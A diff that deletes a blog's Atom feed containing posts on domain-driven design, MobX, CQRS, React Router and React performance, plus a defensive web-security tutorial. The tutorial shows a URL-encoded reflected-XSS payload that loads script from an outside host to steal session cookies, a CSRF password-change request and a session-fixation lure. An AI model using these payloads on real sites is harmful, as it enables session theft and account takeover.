@@ -1,311 +1,5 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-12-29T10:26:01+02:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js and .NET stacks.
-</subtitle><entry><title type="html">Domain Driven Design</title><link href="http://localhost:4000/ddd" rel="alternate" type="text/html" title="Domain Driven Design" /><published>2018-07-28T09:39:37+03:00</published><updated>2018-07-28T09:39:37+03:00</updated><id>http://localhost:4000/ddd</id><content type="html" xml:base="http://localhost:4000/ddd">&lt;p&gt;If you ask five different developers what they understand by domain driven design, you are most likely going to get five different answers. To make matters slightly worse and even if they did one did thoroughly read X book, it’s not readily apparent how one would go about extracting a canonical definition. Virtually everybody working in the field of software development agrees that properly architecting an application is extremely important – just like a poorly constructed building, a software project lacking a solid architectural background can easily come crashing down after a while. But unlike with building, with software because of its fluid nature there’s always the feeling that one can build functionality poorly initially and then go back and change things. The problem with this is if new functionality is built on top of the old one, it never ends up happening, so constructing a solid foundation is extremely important.&lt;/p&gt;
-
-&lt;p&gt;One common definition of DDD that gets thrown around quite a bit is that it’s a top-down way of looking at the development process, but whether somebody subscribes to that definition also depends it depends on what exactly is understood by &lt;em&gt;top&lt;/em&gt; and &lt;em&gt;down&lt;/em&gt;. Ultimately, when we’re creating software we’re trying to solve a problem for somebody – be it another person or business, so in that sense, top-down makes sense. Unfortunately, there is also another definition of top down that is also quite popular and one that’s causing many-a-developer that have to cleanup code a lot of headaches. Keeping in line with definition, it’s quite normal to start with the UI and then work down from there because that’s the part that’s visible. Unfortunately this makes for very, very bad practice. The reason for why it’s such a bad practice is it is actually the backend and not the frontend that is the foundation of any software system, so a well architected backend is crucial.&lt;/p&gt;
-
-&lt;h2 id=&quot;what-ddd-isnt&quot;&gt;What DDD isn’t&lt;/h2&gt;
-&lt;p&gt;Quite often, developers have a very poor understanding of how the or user or customers are actually using the application and sometimes even UX designers have trouble with it because users might not necessarily conform to the clearly thought out scenarios that they’ve planned beforehand. Customer support definitely has that understanding and ideally so should the product owner.&lt;/p&gt;
-
-&lt;p&gt;When doing software development, it’s important that the development team understand the business needs, but it’s also important that the business understands all the technical constraints.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;class Customer
-{
-  public Id { get; set; }
-  public FullName { get; set; }
-  public Address { get; set; }
-} 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;!-- While a PO will most certainly not write any code, he or she can definitely define something like this in enterprise architect.  --&gt;
-
-&lt;p&gt;When ORMs entered the scene, they put the concept of a model or entity at the forefront. All of a sudden developers didn’t really have to concern themselves with low level database queries, join tables in case of many-to-many relations etc. We could just focus on defining the objects and the levels between them and the library would take care of the rest. All this might sound quite familiar and in effect what we’ve described is a model driven architecture approach.  While DDD certainly is compatible with this approach, there is a bit more to it and we’ll get into it shortly.&lt;/p&gt;
-
-&lt;h2 id=&quot;enter-dddd&quot;&gt;Enter DDDD&lt;/h2&gt;
-&lt;p&gt;DDD is actually a bit more prescriptive when it comes to doing things and it introduces more concepts. While a lack of technical or programing skills can be a problem in some cases, communication issues are much more prevalent in software projects – words mean different things to different people, and it all depends on the context so at the core of DDD lies a concept ccalled &lt;em&gt;ubiquitous language&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;I’d like to argue that DDD as a methodology pushes this approach. Which is where ubiquitous language comes to the rescue.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you ask five different developers what they understand by domain driven design, you are most likely going to get five different answers. To make matters slightly worse and even if they did one did thoroughly read X book, it’s not readily apparent how one would go about extracting a canonical definition. Virtually everybody working in the field of software development agrees that properly architecting an application is extremely important – just like a poorly constructed building, a software project lacking a solid architectural background can easily come crashing down after a while. But unlike with building, with software because of its fluid nature there’s always the feeling that one can build functionality poorly initially and then go back and change things. The problem with this is if new functionality is built on top of the old one, it never ends up happening, so constructing a solid foundation is extremely important.</summary></entry><entry><title type="html">Understanding Web Application Security</title><link href="http://localhost:4000/web-security" rel="alternate" type="text/html" title="Understanding Web Application Security" /><published>2018-07-28T09:39:37+03:00</published><updated>2018-07-28T09:39:37+03:00</updated><id>http://localhost:4000/web-security</id><content type="html" xml:base="http://localhost:4000/web-security">&lt;p&gt;I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/my-password.jpg&quot; alt=&quot;my-password&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This sort of thing happens more than you would imagine—what a lot of people don’t know is that hackers rely a lot on &lt;em&gt;social engineering&lt;/em&gt; to gain access to systems. &lt;a href=&quot;https://en.wikipedia.org/wiki/Kevin_Mitnick&quot;&gt;Kevin Mitnick&lt;/a&gt; was famous for calling in, pretending to be somebody he wasn’t and asking for somebody’s password in order to “perform some maintenance”.&lt;/p&gt;
-
-&lt;h2 id=&quot;phishing&quot;&gt;Phishing&lt;/h2&gt;
-&lt;p&gt;If you’ve followed the US 2016 election cycle news, you might have heard that John Podesta, Hillary Clinton’s campaign manager, was hacked. He was actually the victim of a &lt;em&gt;phishing&lt;/em&gt; scam whereby he received an email made to look like an authentic email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn’t pay attention to the URL, it seems), where he entered his old and &lt;em&gt;supposedly&lt;/em&gt; new credentials.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;But this is a scam, it’s not what I wanted to talk about, because you as a developer cannot do anything about it. I actually want to talk about real  vulnerabilities in the software and how they can be addressed, which means understanding the vectors attackers have at their disposal.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;There are quite a lot of developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don’t really have an understanding of what’s happening behind the scenes. Web application security is quite a complex topic, we will be covering:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Cross-site scripting, also called XSS&lt;/li&gt;
-  &lt;li&gt;Session hijacking&lt;/li&gt;
-  &lt;li&gt;Cross-site request forgery, or CSRF&lt;/li&gt;
-  &lt;li&gt;SQL injection&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Both XSS and SQL Injection are cases of &lt;em&gt;code injection&lt;/em&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross-Site Scripting&lt;/h2&gt;
-&lt;p&gt;XSS refers to a vulnerability where an attacker is able to “inject” Javascript code that will be run by the application. In my previous article, I’ve discussed the &lt;a href=&quot;http://achiral.io/cors-made-simple&quot;&gt;same-origin&lt;/a&gt; policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately.&lt;/p&gt;
-
-&lt;p&gt;&lt;i&gt;A lot of people think that SOP prevents XSS attacks. This is &lt;b&gt;not the case.&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;
-
-&lt;p&gt;A typical example of XSS is &lt;em&gt;persistent cross-site scripting&lt;/em&gt;. If a page isn’t properly &lt;em&gt;sanitizing&lt;/em&gt; the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered every time it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/attack.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS attack, whereby the user’s input is not stored in the database, but returned back in the same way it was inputted. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;
-
-&lt;pre&gt;
-GET http://www.onlineshop.com?search=something
-&lt;/pre&gt;
-
-&lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Your search, ‘something’, returned no results.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;…which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result, and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;
-
-&lt;pre&gt;
-GET http://www.onlineshop.com?
-  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
-  HTTP/1.1
-&lt;/pre&gt;
-
-&lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;
-
-&lt;p&gt;What can we do about it? Actually two things:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Validate inputs: this means checking that the user didn’t try to input any funky stuff and warning him if this is the case.&lt;/li&gt;
-  &lt;li&gt;Sanitize outputs: everything that’s rendered to the page must be HTML escaped. This means that script blocks will be displayed as text, and won’t be part of the DOM, and thus executed.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;If you are developing with Node / Express, there are plenty of packages to help you safeguard against XSS attacks, such as &lt;a href=&quot;https://www.npmjs.com/package/helmet&quot;&gt;helmet&lt;/a&gt; or &lt;a href=&quot;https://www.npmjs.com/package/xssfilter&quot;&gt;xssfilter&lt;/a&gt; etc.&lt;/p&gt;
-
-&lt;h2 id=&quot;session-hijacking&quot;&gt;Session Hijacking&lt;/h2&gt;
-&lt;p&gt;Most web applications use a session mechanism which allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of &lt;em&gt;session_id&lt;/em&gt; (usually a string) and setting a cookie with that value on the user’s browser. Session hijacking is a way of getting to know that string.&lt;/p&gt;
-
-&lt;p&gt;One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted Wi-Fi hotspot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won’t be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.&lt;/p&gt;
-
-&lt;p&gt;Another way to gain access to a user’s session is to get that user to install a malware on his/hers computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it.&lt;/p&gt;
-
-&lt;p&gt;A yet another way of accomplishing session hijacking is &lt;em&gt;session fixation&lt;/em&gt;. There are plenty of sites that accept a session ID in the URL, such as:&lt;/p&gt;
-
-&lt;pre&gt;
-http://www.website.com?sid=asb1sadasdasdan23123
-&lt;/pre&gt;
-
-&lt;p&gt;The reason why they do it is because a lot of users turn of their cookies, ironically, for security reasons. This however would open them up to scams, like somebody sending them an email which says:&lt;/p&gt;
-
-&lt;blockquote&gt;
-Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit card and address information to receive a free bonus on your order.
-&lt;/blockquote&gt;
-
-&lt;p&gt;Since the attacker knows the session id, he/she can also log to that page and see the information inputted by the user.&lt;/p&gt;
-
-&lt;h2 id=&quot;cross-site-request-forgery&quot;&gt;Cross-Site Request Forgery&lt;/h2&gt;
-&lt;p&gt;CSRF is an attack that tricks the victim into submitting a malicious request, and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is &lt;em&gt;social engineering&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/csfr.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Let’s say a site exposes some functionality in the form of a web request, like so:&lt;/p&gt;
-
-&lt;pre&gt;
-GET https://www.thesite.com/account?password=val HTTP/1.1
-&lt;/pre&gt;
-
-&lt;p&gt;This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link &lt;strong&gt;while logged in&lt;/strong&gt;, that’s going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker etc.&lt;/p&gt;
-
-&lt;p&gt;An action that changes the password will more likely be a POST than a GET, but that doesn’t make it CSRF-proof either, because a user can be tricked into submitting a form. Here’s how that would work: you could have a form with a hidden input like so:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;Using HTML forms with email is not really possible, because a lot of clients disable them or warn about them, but you could redirect the user to a page hosted somewhere. It turns out you don’t even have to trick him/her to click on the submit button, that can be done by the site using Javascript (say by reacting to the document load event).&lt;/p&gt;
-
-&lt;p&gt;How about PUT and DELETE? Turns out that the &lt;em&gt;same-origin policy&lt;/em&gt; helps us here, because attackers cannot do XHR requests from their site to the &lt;em&gt;http://www.thesite.com&lt;/em&gt;. It’s also why for POST attacks a form is being used instead of an POST XHR. SOP blocks that too.&lt;/p&gt;
-
-&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
-&lt;p&gt;And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/exploit.png&quot; alt=&quot;exploit&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;For SQL injection to work, you’d have to be writing your SQL queries using string interpolation / concatenation.&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.&lt;/p&gt;</content><author><name></name></author><summary type="html">I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:</summary></entry><entry><title type="html">A Really, Really Short Intro To MobX</title><link href="http://localhost:4000/mobx" rel="alternate" type="text/html" title="A Really, Really Short Intro To MobX" /><published>2017-12-07T05:39:37+02:00</published><updated>2017-12-07T05:39:37+02:00</updated><id>http://localhost:4000/mobx</id><content type="html" xml:base="http://localhost:4000/mobx">&lt;p&gt;Redux, although very powerful, has a reputation of not being exactly easy to pick up, especially since you go past simple &lt;em&gt;hello world&lt;/em&gt; type apps and you actually get into the nitty gritty–by that I mean, when you begin to have side-effects (calls to the server come to mind here). Luckily Redux has a little bit of competition in the form of MobX and if you’ve had a frustrating experience with Redux, it might be for you.&lt;/p&gt;
-
-&lt;h2 id=&quot;enter-mobx&quot;&gt;Enter MobX&lt;/h2&gt;
-&lt;p&gt;The philosophy of the two frameworks is somewhat different: while both act as a reactive application store container, Redux leans more towards a functional style of programming which involves state immutability and &lt;em&gt;pure reducers&lt;/em&gt;, whereas MobX actually relies on mutable state because the state is observable.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/mobx-overview.png&quot; alt=&quot;mobx-overview&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As I’ve explained in this article &lt;a href=&quot;/redux-async-flow&quot;&gt;here&lt;/a&gt;, anything but the simplest application involves side-effects, not to mention that any application that communicates to a backend service is by default non-pure and that means thunks which are not exactly easy to implement and maintain. Just as Redux, MobX holds the state for the whole application (as opposed to Facebook’s Flux implementation) and relies on Actions to change this state. MobX innovates by adding &lt;em&gt;reactions&lt;/em&gt; and &lt;em&gt;derivations&lt;/em&gt; to the mix, making it a truly reactive framework. Derivations are simply computed properties of other store properties and reactions are a way to react to mutations of the store and/or computed properties. How does MobX know a property has changed? Well, it works in a similar manner to Vue in that it wraps the state objects in observable objects and it adds getters and setters to the properties, as well as overriding methods such as &lt;em&gt;push()&lt;/em&gt; for observable arrays etc.&lt;/p&gt;
-
-&lt;p&gt;Which means the whole flow looks something like:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/mobx-flow.png&quot; alt=&quot;mobx-flow&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Since your state is observable, you don’t really need to do anything fancy to support async changes in your state, because whenever a property is set on an object or a collection changes, MobX runtime gets notified.&lt;/p&gt;
-
-&lt;h2 id=&quot;show-me-some-code&quot;&gt;Show Me Some Code!&lt;/h2&gt;
-&lt;p&gt;Using MobX is very simple: all one needs to do is to add decorators to your code to specify which properties and observable / reactive etc. So let’s say we have the following class for the application:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/cb14fbb06c7d89a5a9d1ed31b815b76c.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;Hooking up the store to a React component is also very simple:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/5beba93b2e280b3422c2f0c5d87184e7.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;And there you have it. Of course, MobX’s reactive and observable nature makes it usable with any library.&lt;/p&gt;</content><author><name></name></author><summary type="html">Redux, although very powerful, has a reputation of not being exactly easy to pick up, especially since you go past simple hello world type apps and you actually get into the nitty gritty–by that I mean, when you begin to have side-effects (calls to the server come to mind here). Luckily Redux has a little bit of competition in the form of MobX and if you’ve had a frustrating experience with Redux, it might be for you.</summary></entry><entry><title type="html">CQRS And Parallels With Flux</title><link href="http://localhost:4000/cqrs-flux" rel="alternate" type="text/html" title="CQRS And Parallels With Flux" /><published>2017-12-04T05:39:37+02:00</published><updated>2017-12-04T05:39:37+02:00</updated><id>http://localhost:4000/cqrs-flux</id><content type="html" xml:base="http://localhost:4000/cqrs-flux">&lt;p&gt;CQRS stands for Command Query Responsibility Segregation, and the main idea behind it is that we want to separate the reading part of the pipeline from the writing part. With CQRS, a method either does writes, or reads, but never both — or to put it more simply, a method that returns a result should never change that result.&lt;/p&gt;
-
-&lt;p&gt;Architecturally, it looks something like this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/cqrs.png&quot; alt=&quot;cqrs&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;What would be the advantage of separating the read and write paths? Well, for starters, in most applications, the number of read operations performed is orders of magnitude bigger than the number of write operations. Imagine your typical Facebook type app. As a user, how often do you browse other people’s profiles, and how often do you actually post on your own page? So obviously, for an application like that we need an architecture that scales out easily—namely it should be easy to host our web application on multiple servers. The stateless nature of the web helps in that respect, but what is really problematic is the fact that we have to track state — and we have to do it for multiple users. So let’s look at a way of doing that.&lt;/p&gt;
-
-&lt;p&gt;Obviously, if you are writing and updating data using the same model, it’s pretty hard to do any read related optimizations, because you will always be transferring the whole object over the wire when you are doing CRUD. There is of course the possibility of doing projections in the GET methods of your API, but this involves doing expensive inner joins on your relational database, then projecting the result of that query to some kind of view model (usually doing some kind of mapping). These can be very expensive operations, especially if your database is partitioned across multiple servers.&lt;/p&gt;
-
-&lt;p&gt;A typical distributed application works like the one in the picture. A user will make a request to a public endpoint, and based on the load of each server in the network, it will redirect the request to one server in the list. This way, as the number of users for our application increases, we can simply add additional servers to our server farm.
-The problem with the following picture is keeping track of data.&lt;/p&gt;
-
-&lt;p&gt;We can do two things:&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Connect all application servers to a single database server.&lt;/li&gt;
-  &lt;li&gt;We can have each application have it’s own server.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;But the problem in case number 1. is that the database server quickly becomes a bottleneck, and in case number 2. we might have a be redirected to server B when he/she writes something, and then when reading that data, a user would be redirected to server A. To solve this, there are two strategies that can be used, and they can be used together. Affinity and replication.&lt;/p&gt;
-
-&lt;p&gt;Replication means that we use approach number 2. and we pretty much duplicate data on all servers. Affinity means that we redirect traffic for a specific user to a specific server instance. User “X” will write to server A, user “Y” to server B etc. This means that we also need to have a more intelligent load balancer in place. Also, an issue with the affinity strategy is: what do you do if a user needs to get data from multiple users—let’s say rendering the wall in Facebook. The users might have their data on multiple servers.&lt;/p&gt;
-
-&lt;h2 id=&quot;cqrs-to-the-rescue&quot;&gt;CQRS to the rescue&lt;/h2&gt;
-
-&lt;p&gt;An application the size of Facebook probably has hundreds of thousands of servers and sophisticated proprietary caching and data storage. But it is a good example of the problems that can arise when scaling out web applications. We also don’t want to replicate all the data on all database server because it really becomes huge. So we usually use a combination of the techniques — for a very big application we would replicate data across data centers for speed and consistency, and we also use some for of affinity.&lt;/p&gt;
-
-&lt;p&gt;Let’s get back to the Facebook wall example. Imagine that we need to aggregate data from 30 different Facebook friends. Because we used write affinity, their posts might be on different servers, so aggregating the whole wall would be quite time consuming. Jill from the US might post something, my colleagues from the Netherlands might post something else, so it’s very unlikely the data will end up on the same database server. Decoupling reading and writing allows us to have both read and write affinity. The read database in the architectural diagram acts as a view cache. With CQRS, posting something on your wall will write it into the primary (write) database(s), and this will send notification events to everybody that’s interested in that. So let’s say my user is configured to always have read affinity with server X. That server will be notified by the servers which host the write part of the application queue, and it will update it’s local cache. Also, not only does the read part have different user affinity than the write part, the models are usually denormalized for speed of access.&lt;/p&gt;
-
-&lt;h2 id=&quot;enter-flux&quot;&gt;Enter Flux&lt;/h2&gt;
-
-&lt;p&gt;It didn’t occur to me for quite some time, but there are significant similarities between CQRS and Flux—one being present on the server side and the other one on the client side. In fact, they can be used together.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/flux.png&quot; alt=&quot;flux&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The parallels here mean that you don’t mutate state directly.&lt;/p&gt;</content><author><name></name></author><summary type="html">CQRS stands for Command Query Responsibility Segregation, and the main idea behind it is that we want to separate the reading part of the pipeline from the writing part. With CQRS, a method either does writes, or reads, but never both — or to put it more simply, a method that returns a result should never change that result.</summary></entry><entry><title type="html">Multiple Layout Levels With React Router 4</title><link href="http://localhost:4000/react-router-4" rel="alternate" type="text/html" title="Multiple Layout Levels With React Router 4" /><published>2017-12-01T05:39:37+02:00</published><updated>2017-12-01T05:39:37+02:00</updated><id>http://localhost:4000/react-router-4</id><content type="html" xml:base="http://localhost:4000/react-router-4">&lt;p&gt;Today, we are going to look at building page layouts with React Router 4. If you’ve switched to it, you would find that a lot of the code you used with Router 3 doesn’t really work, and a lot of the answers on Stack Overflow refer to older version.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/router4.jpeg&quot; alt=&quot;router-4&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A webpage usually has common elements such as the top bar where the user can log in/out, the footer etc. Since the DRY (don’t repeat yourself) principle tells us not to duplicate code, you obviously don’t want to copy paste the common parts of the layout in every page of your website you are building. This is the reason why frameworks such as Rails or ASP.NET MVC come with layout and partial view functionality out of the box.&lt;/p&gt;
-
-&lt;p&gt;React’s compositional nature would also allow for this, but since you are on the client and you (presumably) want to use &lt;a href=&quot;https://en.wikipedia.org/wiki/Deep_linking&quot;&gt;deep-linking&lt;/a&gt;, you would use a routing package such as React Router to be able to react to client-side route changes.&lt;/p&gt;
-
-&lt;p&gt;As a side note, client-side routing packages rely on the browser’s ability to redirect to &lt;em&gt;anchors&lt;/em&gt;, which locations within the same page, so it doesn’t to a request to the server. So whenever you are doing something like:&lt;/p&gt;
-
-&lt;pre&gt;
-&amp;lt;a href=&quot;http://thepage.com#anchor&quot;&amp;gt;Click me&amp;lt;/a&amp;gt;
-&lt;/pre&gt;
-
-&lt;p&gt;…the page will scroll to the position of the element with &lt;em&gt;id=”anchor”&lt;/em&gt; within the same page. In the early days of the web, this was useful for giving people links to a portion of the page–say if you had a long article, you could simply link to a paragraph in that article. Of course, that’s history because after &lt;a href=&quot;https://en.wikipedia.org/wiki/XMLHttpRequest&quot;&gt;XHR&lt;/a&gt; came along courtesy of Microsoft, we ended up with Ajax and with a plethora of frameworks on our hands, including React and its preferred routing package, React Router.&lt;/p&gt;
-
-&lt;h2 id=&quot;a-look-at-react-router-as-it-comes-out-of-the-box&quot;&gt;A Look At React Router As It Comes Out Of The Box&lt;/h2&gt;
-&lt;p&gt;Since building a React application is like assembling Lego pieces (components), it would make sense that React Router also works the same, so your typical application root component (&lt;i&gt;&amp;lt;App/&amp;gt;&lt;/i&gt; by convention) would look something like this:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/6e85c1ad656f6f8c92164479c37d9a7b.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;As you can see, it’s not really very hard to add common layout elements to a React application that is using React Router, because we can easily include components such as &lt;i&gt;Header&lt;/i&gt; and &lt;i&gt;Footer&lt;/i&gt; in the root component of the application. So…&lt;/p&gt;
-
-&lt;h2 id=&quot;what-exact-problem-are-we-trying-to-solve-here&quot;&gt;What Exact Problem Are We Trying To Solve Here?&lt;/h2&gt;
-&lt;p&gt;That is all fine and dandy, but what if you want to:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Have layouts only for some pages and not for others (such as a login page)?&lt;/li&gt;
-  &lt;li&gt;Have one layout for some pages and another for other pages?&lt;/li&gt;
-  &lt;li&gt;Have nested levels of layout?&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Turns out React’s compositional nature helps us here. We are going to start out by creating a &lt;em&gt;stateless&lt;/em&gt; component for our layout, which is going to look like this:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/dd7638803e2d716c01b7a79c2692ab9b.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;We can also have a Layout2, Layout3 etc. and so forth. Not to mention that we can embed one layout in another and add extra stuff.&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/06454bf059091bd9e6d15d8e0692c2aa.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;And there you have it! That is how you can achieve 1, 2 and 3 with React Router. Not only that, but this is how you pass values for parameters, say if you have something like a &lt;em&gt;product_id&lt;/em&gt; which comes from the query string, because the router automatically passes query string params as props to our layout components.&lt;/p&gt;
-
-&lt;p&gt;Happy coding!&lt;/p&gt;</content><author><name></name></author><summary type="html">Today, we are going to look at building page layouts with React Router 4. If you’ve switched to it, you would find that a lot of the code you used with Router 3 doesn’t really work, and a lot of the answers on Stack Overflow refer to older version.</summary></entry><entry><title type="html">Tweaking React Application Performance</title><link href="http://localhost:4000/react-perf" rel="alternate" type="text/html" title="Tweaking React Application Performance" /><published>2017-11-19T05:39:37+02:00</published><updated>2017-11-19T05:39:37+02:00</updated><id>http://localhost:4000/react-perf</id><content type="html" xml:base="http://localhost:4000/react-perf">&lt;p&gt;React is fast. If you’re coming from the world of Angular, you might think it’s REALLY, REALLY fast. But no matter how fast a library is, there will come a time when you will encounter performance bottlenecks, especially if you are building something like a page that has infinite scrolling and you end up with a lot of objects on your page. Which is why it’s important to understand how React handles component updates and how its &lt;em&gt;reconciliation&lt;/em&gt; process works.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/react-perf.png&quot; alt=&quot;react-perf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;You might have noticed something: in React (as opposed to Vue or AngularJS), changing state directly (mutating a property of a component) doesn’t have any effect on the actual UI and you have to actually call the method &lt;em&gt;setState()&lt;/em&gt; in order for this to happen. This is because React needs a way to figure out the parts of the state that changed (if you are wondering how Vue is doing this, know that it’s wrapping the state properties with getters and setters, but that’s a subject for another article).&lt;/p&gt;
-
-&lt;h2 id=&quot;understanding-the-diffing-process&quot;&gt;Understanding The Diffing Process&lt;/h2&gt;
-&lt;p&gt;I will briefly try to give an overview of how React handles state changes: when calling &lt;em&gt;setState()&lt;/em&gt;, React does a comparison (or diffing) between the value of the UI components and the component state, but it doesn’t check directly against the browser DOM, because that would be very slow. Instead, it maintains a &lt;em&gt;virtual DOM&lt;/em&gt; in memory and it does diffing against this.&lt;/p&gt;
-
-&lt;p&gt;Normally the optimal diffing algorithmic for two trees is of O(N&lt;sup&gt;3&lt;/sup&gt;) complexity, but Reacts uses some heuristics, which makes this faster for the majority of real cases. Namely:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;React first starts with the root of the trees. If they are not the same instance, it marks the whole tree as “dirty”, which will result in a complete re-render.&lt;/li&gt;
-  &lt;li&gt;If they are the same instance, it will proceed to compare all the properties and so forth recursively.&lt;/li&gt;
-  &lt;li&gt;If the instance has not changed, then React proceeds further down the tree and checks the properties of the objects.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/v-dom.png&quot; alt=&quot;v-dom&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see, calling &lt;em&gt;setState()&lt;/em&gt; doesn’t re-render that part of the component synchronously. Instead it just marks it, and rendering happens at a later tick in the JS event loop.&lt;/p&gt;
-
-&lt;blockquote&gt;
